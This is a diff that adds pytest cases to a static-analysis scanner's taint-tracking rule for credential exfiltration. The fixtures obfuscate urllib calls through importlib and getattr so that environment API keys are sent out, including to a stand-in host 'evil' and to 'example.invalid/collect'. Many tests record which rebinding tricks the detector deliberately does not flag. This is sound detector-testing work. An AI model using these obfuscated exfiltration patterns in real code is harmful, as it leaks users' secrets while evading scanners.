@@ -17,7 +17,11 @@
 
 from __future__ import annotations
 
+import ast
 import json
+import textwrap
+
+import pytest
 
 from skillspector.nodes.analyzers import behavioral_taint_tracking
 from skillspector.nodes.deduplicate import deduplicate
@@ -41,6 +45,651 @@ def _rule_ids(findings: list) -> set[str]:
 
 
 class TestCredentialExfiltration:
+    def test_starred_assignment_replaces_reflective_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "first, *opener = [1, 2]\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+        assert "TT3" not in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize("name", ["importlib", "getattr"])
+    def test_relative_import_replaces_reflective_helper(self, name):
+        code = (
+            "import importlib, os\n"
+            f"from . import {name}\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+        assert "TT3" not in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize("inline", [True, False])
+    def test_inline_reflective_callee(self, inline):
+        module = 'importlib.import_module("urllib.request")' if inline else "module"
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            f'getattr({module}, "urlopen")(os.environ.get("API_KEY"))\n'
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_class_body_reflective_call_is_detected(self):
+        code = (
+            "import importlib, os\n"
+            "class Client:\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            '    opener(os.environ.get("API_KEY"))\n'
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_match_capture_replaces_reflective_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "match (lambda value: value):\n"
+            "    case opener:\n"
+            "        pass\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+        assert "TT3" not in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize("replacement", ["lambda value: value", 'getattr(module, "urlopen")'])
+    def test_walrus_respects_expression_order(self, replacement):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            f'(opener := {replacement}, opener(os.environ.get("API_KEY")))\n'
+        )
+        assert ("TT3" in _rule_ids(_run(code))) is ("getattr" in replacement)
+
+    @pytest.mark.parametrize("replacement", ["lambda value: value", 'getattr(module, "urlopen")'])
+    def test_function_reads_global_at_call_site(self, replacement):
+        code = (
+            "import importlib, os\n"
+            "def send():\n"
+            '    return opener(os.environ.get("API_KEY"))\n'
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "send()\n"
+            f"opener = {replacement}\n"
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_function_call_before_reflective_binding_stays_safe(self):
+        code = (
+            "import importlib, os\n"
+            "def send():\n"
+            '    return opener(os.environ.get("API_KEY"))\n'
+            "opener = lambda value: value\n"
+            "send()\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+        )
+        assert "TT3" not in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize(
+        ("initial_binding", "argument_binding", "expected"),
+        [
+            ("opener = lambda value: value", 'getattr(module, "urlopen")', True),
+            ('opener = getattr(module, "urlopen")', "lambda value: value", False),
+        ],
+    )
+    def test_function_call_uses_callee_before_arguments_and_globals_after_arguments(
+        self, initial_binding, argument_binding, expected
+    ):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            f"{initial_binding}\n"
+            "def send(unused):\n"
+            '    opener(os.environ.get("API_KEY"))\n'
+            f"send(opener := {argument_binding})\n"
+        )
+        assert ("TT3" in _rule_ids(_run(code))) is expected
+
+    @pytest.mark.parametrize(
+        ("global_binding", "caller_binding", "expected"),
+        [
+            ('getattr(module, "urlopen")', "lambda value: value", True),
+            ("lambda value: value", 'getattr(module, "urlopen")', False),
+        ],
+    )
+    def test_function_call_uses_lexical_scope_not_caller_locals(
+        self, global_binding, caller_binding, expected
+    ):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            f"opener = {global_binding}\n"
+            "def send():\n"
+            '    opener(os.environ.get("API_KEY"))\n'
+            "def wrapper():\n"
+            f"    opener = {caller_binding}\n"
+            "    send()\n"
+            "wrapper()\n"
+        )
+        assert ("TT3" in _rule_ids(_run(code))) is expected
+
+    def test_class_method_definition_replaces_reflective_class_binding(self):
+        code = (
+            "import importlib, os\n"
+            "class Client:\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            "    def opener(value):\n"
+            "        return value\n"
+            '    opener(os.environ.get("API_KEY"))\n'
+        )
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_reflective_prepass_checks_shared_runtime_budget_during_expansion(self):
+        source = (
+            "def f0():\n    pass\n"
+            + "".join(
+                f"def f{index}():\n    f{index - 1}()\n    f{index - 1}()\n"
+                for index in range(1, 21)
+            )
+            + "f20()\n"
+        )
+        tree = ast.parse(source)
+        checks = 0
+
+        class BudgetExpiredError(RuntimeError):
+            pass
+
+        def check_runtime():
+            nonlocal checks
+            checks += 1
+            if checks == 500:
+                raise BudgetExpiredError
+
+        with pytest.raises(BudgetExpiredError):
+            behavioral_taint_tracking._build_reflective_sink_aliases(
+                tree, check_runtime=check_runtime
+            )
+        assert checks == 500
+
+    @pytest.mark.parametrize(
+        ("replacement", "call"),
+        [
+            ("send = lambda value: value", "send(None)"),
+            ("def send(value):\n    return value", "send(None)"),
+            ("from math import fabs as send", "send(1)"),
+            ("class send:\n    pass", "send()"),
+        ],
+        ids=["assignment", "redefinition", "import", "class"],
+    )
+    def test_rebound_function_name_does_not_call_stale_definition(self, replacement, call):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "def send():\n"
+            '    opener(os.environ.get("API_KEY"))\n'
+            f"{replacement}\n"
+            f"{call}\n"
+        )
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_function_rebound_in_both_branches_is_not_restored_at_join(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "def send():\n"
+            '    opener(os.environ.get("API_KEY"))\n'
+            "if condition:\n"
+            "    send = lambda value: value\n"
+            "else:\n"
+            "    send = lambda value: value\n"
+            "send(None)\n"
+        )
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_function_may_survive_rebinding_in_one_branch(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "def send():\n"
+            '    opener(os.environ.get("API_KEY"))\n'
+            "if condition:\n"
+            "    send = lambda: None\n"
+            "send()\n"
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_function_alias_survives_original_name_rebinding(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "def send():\n"
+            '    opener(os.environ.get("API_KEY"))\n'
+            "alias = send\n"
+            "send = lambda: None\n"
+            "alias()\n"
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_function_call_before_rebinding_still_analyzes_definition(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "def send():\n"
+            '    opener(os.environ.get("API_KEY"))\n'
+            "send()\n"
+            "send = lambda value: value\n"
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_multiple_function_calls_track_each_global_binding(self):
+        code = (
+            "import importlib, os\n"
+            "def send():\n"
+            '    return opener(os.environ.get("API_KEY"))\n'
+            "opener = lambda value: value\n"
+            "send()\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "send()\n"
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize(
+        "binding",
+        [
+            "del opener",
+            "try:\n    pass\nexcept Exception as opener:\n    pass",
+            "match value:\n    case opener:\n        pass",
+            "match value:\n    case [*opener]:\n        pass",
+            "match value:\n    case {'key': _, **opener}:\n        pass",
+        ],
+        ids=["delete", "exception", "match-as", "match-star", "match-rest"],
+    )
+    @pytest.mark.parametrize("scope", ["local", "global", "nested"])
+    def test_later_binding_respects_whole_function_scope(self, binding, scope):
+        # A local binding applies even before that statement runs. A declaration
+        # or a binding inside a nested function must not hide the outer handle.
+        body = 'opener(os.environ.get("API_KEY"))\n'
+        if scope == "global":
+            body = "global opener\n" + body + binding + "\n"
+        elif scope == "nested":
+            body += "def inner():\n" + textwrap.indent(binding, "    ") + "\n"
+        else:
+            body += binding + "\n"
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "def send(value):\n" + textwrap.indent(body, "    ")
+        )
+        compile(code, "fixture.py", "exec")
+        assert ("TT3" in _rule_ids(_run(code))) is (scope != "local")
+
+    def test_constructed_urllib_sink_tracks_environment_taint(self):
+        code = (
+            "import importlib, os\n"
+            '_mod = importlib.import_module("ur" + "llib.request")\n'
+            'opener = getattr(_mod, "url" + "open")\n'
+            'secret = os.environ.get("API_KEY")\n'
+            'request = getattr(_mod, "Re" + "quest")('
+            '"https://example.invalid/collect", data=secret.encode())\n'
+            "opener(request)\n"
+        )
+
+        tt3 = [finding for finding in _run(code) if finding.rule_id == "TT3"]
+
+        assert len(tt3) == 1
+        assert tt3[0].severity == "CRITICAL"
+        assert "urllib.request.urlopen" in tt3[0].message
+
+    def test_constructed_urllib_sink_with_public_data_is_not_exfiltration(self):
+        code = (
+            "import importlib\n"
+            '_mod = importlib.import_module("ur" + "llib.request")\n'
+            'opener = getattr(_mod, "url" + "open")\n'
+            'request = getattr(_mod, "Re" + "quest")('
+            '"https://example.invalid/health", data=b"status")\n'
+            "opener(request)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_runtime_only_reflective_sink_name_is_not_guessed(self):
+        code = (
+            "import importlib, os\n"
+            '_mod = importlib.import_module("urllib.request")\n'
+            'name = input("attribute: ")\n'
+            "opener = getattr(_mod, name)\n"
+            'secret = os.environ.get("API_KEY")\n'
+            "opener(secret)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_reassigned_reflective_handle_does_not_keep_stale_sink_identity(self):
+        code = (
+            "import importlib, os\n"
+            '_mod = importlib.import_module("urllib.request")\n'
+            'opener = getattr(_mod, "urlopen")\n'
+            "opener = lambda value: value\n"
+            'secret = os.environ.get("API_KEY")\n'
+            "opener(secret)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_reflective_handle_does_not_leak_across_function_scopes(self):
+        code = (
+            "import importlib, os\n"
+            "def configure():\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            "    return opener\n"
+            "def send():\n"
+            '    secret = os.environ.get("API_KEY")\n'
+            "    return opener(secret)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_reflective_handle_used_before_reassignment_keeps_sink_identity(self):
+        code = (
+            "import importlib, os\n"
+            '_mod = importlib.import_module("urllib.request")\n'
+            'opener = getattr(_mod, "urlopen")\n'
+            'secret = os.environ.get("API_KEY")\n'
+            "opener(secret)\n"
+            "opener = lambda value: value\n"
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_class_binding_does_not_become_a_method_closure(self):
+        code = (
+            "import importlib, os\n"
+            "class Client:\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            "    def send(self):\n"
+            '        secret = os.environ.get("API_KEY")\n'
+            "        return opener(secret)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_importlib_parameter_shadowing_is_not_treated_as_real_import(self):
+        code = (
+            "import os\n"
+            "def send(importlib):\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            '    secret = os.environ.get("API_KEY")\n'
+            "    return opener(secret)\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_function_local_importlib_alias_remains_resolvable(self):
+        code = (
+            "import os\n"
+            "def send():\n"
+            "    import importlib as loader\n"
+            '    module = loader.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            '    secret = os.environ.get("API_KEY")\n'
+            "    return opener(secret)\n"
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_function_local_import_module_alias_remains_resolvable(self):
+        code = (
+            "import os\n"
+            "def send():\n"
+            "    from importlib import import_module as load\n"
+            '    module = load("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            '    secret = os.environ.get("API_KEY")\n'
+            "    return opener(secret)\n"
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_shadowed_getattr_is_not_treated_as_builtin(self):
+        code = (
+            "import importlib, os\n"
+            "def send(getattr):\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            '    return opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_loop_target_invalidates_reflective_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "for opener in [lambda value: value]:\n"
+            "    pass\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_named_expression_invalidates_reflective_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "if (opener := (lambda value: value)):\n"
+            "    pass\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_with_target_invalidates_reflective_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "with open(__file__) as opener:\n"
+            "    pass\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_exception_target_invalidates_reflective_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "try:\n"
+            "    pass\n"
+            "except Exception as opener:\n"
+            "    pass\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_delete_invalidates_reflective_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "del opener\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_lambda_parameter_shadows_reflective_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            'callback = lambda opener: opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_method_local_reflective_handle_is_detected(self):
+        code = (
+            "import importlib, os\n"
+            "class Client:\n"
+            "    def send(self):\n"
+            '        module = importlib.import_module("urllib.request")\n'
+            '        opener = getattr(module, "urlopen")\n'
+            '        return opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_deep_unrelated_expression_does_not_abort_sink_resolution(self):
+        padding = "+".join("1" for _ in range(600))
+        code = (
+            "import os, urllib.request\n"
+            f"padding = {padding}\n"
+            'urllib.request.urlopen(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_deep_function_expression_does_not_abort_sink_resolution(self):
+        padding = "+".join("1" for _ in range(600))
+        code = (
+            "import importlib, os\n"
+            "def send():\n"
+            f"    padding = {padding}\n"
+            '    module = importlib.import_module("urllib.request")\n'
+            '    opener = getattr(module, "urlopen")\n'
+            '    return opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_relative_import_is_not_treated_as_stdlib_importlib(self):
+        code = (
+            "import os\n"
+            "from .importlib import import_module as load\n"
+            'module = load("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_bare_annotation_preserves_existing_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "opener: object\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_annotation_expression_does_not_create_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener: getattr(module, "urlopen")\n'
+            "opener = lambda value: value\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_function_uses_global_handle_bound_after_definition(self):
+        code = (
+            "import importlib, os\n"
+            "def send():\n"
+            '    return opener(os.environ.get("API_KEY"))\n'
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "send()\n"
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_function_does_not_freeze_replaced_global_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "def send():\n"
+            '    return opener(os.environ.get("API_KEY"))\n'
+            "opener = lambda value: value\n"
+            "send()\n"
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_conditional_join_retains_possible_reflective_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            "if input():\n"
+            '    opener = getattr(module, "urlopen")\n'
+            "else:\n"
+            "    opener = lambda value: value\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_conditional_join_drops_handle_replaced_on_every_branch(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "if input():\n"
+            "    opener = lambda value: value\n"
+            "else:\n"
+            "    opener = print\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" not in _rule_ids(_run(code))
+
+    def test_global_declaration_does_not_pre_shadow_outer_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "def send():\n"
+            "    global opener\n"
+            '    opener(os.environ.get("API_KEY"))\n'
+            "    opener = lambda value: value\n"
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_comprehension_target_does_not_shadow_outer_handle(self):
+        code = (
+            "import importlib, os\n"
+            'module = importlib.import_module("urllib.request")\n'
+            'opener = getattr(module, "urlopen")\n'
+            "discard = [opener for opener in ()]\n"
+            'opener(os.environ.get("API_KEY"))\n'
+        )
+
+        assert "TT3" in _rule_ids(_run(code))
+
     def test_same_line_taint_sinks_preserve_both_occurrences(self) -> None:
         call = 'requests.post("http://evil", data=secret)'
         code = f'import os, requests\nsecret = os.environ.get("KEY")\n{call}; {call}\n'
